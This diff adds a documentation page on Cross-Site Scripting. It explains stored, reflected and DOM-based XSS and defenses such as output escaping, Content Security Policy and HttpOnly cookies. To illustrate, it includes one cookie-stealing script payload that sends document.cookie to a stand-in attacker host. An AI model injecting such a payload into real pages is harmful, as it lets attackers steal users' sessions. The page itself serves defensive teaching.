@@ -1,0 +1,45 @@
+---
+title: XSS
+description: How an attacker gets a script to run in another user's browser under a trusted site's origin — the three main varieties, and what actually stops them.
+category: Security
+weight: 6
+interactive: true
+interactiveType: ["ItemExplorer"]
+---
+
+**Cross-Site Scripting (XSS)** happens when an attacker gets their own JavaScript to execute inside a page under a *different, trusted* origin — meaning that script runs with the same access to cookies, DOM, and API calls a legitimate script on that page would have. It's not a bug in the browser; it's a failure to keep untrusted data from being interpreted as code.
+
+## Three varieties
+
+<ItemExplorer
+  title="Types of XSS"
+  layout="table"
+  tableColumns={[{ key: "mechanism", label: "Mechanism" }]}
+  items={[
+    { id: "stored", label: "Stored", color: "red", columns: { mechanism: "Malicious input is saved server-side (a comment, a profile field) and served back to every user who views that page — the most dangerous variety, since one injection point compromises many victims." } },
+    { id: "reflected", label: "Reflected", color: "orange", columns: { mechanism: "Malicious input comes from the request itself (a query parameter) and is echoed straight back into the response — requires tricking a victim into clicking a crafted link." } },
+    { id: "dom-based", label: "DOM-based", color: "purple", columns: { mechanism: "The vulnerable code never touches the server at all — client-side JavaScript reads something attacker-controlled (like location.hash) and writes it into the DOM unsafely." } },
+  ]}
+/>
+
+## A minimal example
+
+If a page renders a comment like this without escaping it:
+
+```html
+<div>{{ comment }}</div>
+```
+
+and a comment contains `<script>fetch('https://evil.example/steal?c='+document.cookie)</script>`, every visitor who views that comment runs the attacker's script — under the site's own origin, with access to that site's cookies (unless [`HttpOnly`](/en/security/sessions) is set).
+
+## What actually stops it
+
+- **Escaping output** — encoding user-controlled data before it's inserted into HTML, so `<script>` becomes literal text (`&lt;script&gt;`) instead of a tag. Most modern frameworks (React, Vue) do this by default, which is why manually bypassing it (`dangerouslySetInnerHTML`, `v-html`) deserves extra scrutiny.
+- **Content Security Policy** — even if malicious markup gets through, a strict [CSP](/en/security/content-security-policy) can block inline scripts from executing at all.
+- **`HttpOnly` cookies** — don't stop the script from running, but stop it from being able to read session cookies even if it does.
+
+## See also
+
+- **[Content Security Policy](/en/security/content-security-policy)** — a defense-in-depth layer against exactly this.
+- **[Sessions](/en/security/sessions)** — why `HttpOnly` on a session cookie matters specifically because of XSS.
+- **[CSRF](/en/security/csrf)** — a different attack that doesn't require injecting any script at all.
